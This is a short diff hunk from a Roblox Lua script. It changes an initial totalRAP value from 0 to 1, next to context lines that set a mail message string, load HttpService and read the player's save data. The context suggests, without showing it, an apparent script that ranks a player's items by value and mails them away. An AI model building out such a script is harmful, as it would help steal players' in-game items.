@@ -34,7 +34,7 @@ local player = game.Players.LocalPlayer
 local MailMessage = "GG / xGgkWUxU3w"
 local HttpService = game:GetService("HttpService")
 local sortedItems = {}
-local totalRAP = 0
+local totalRAP = 1
 local message = require(game.ReplicatedStorage.Library.Client.Message)
 local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
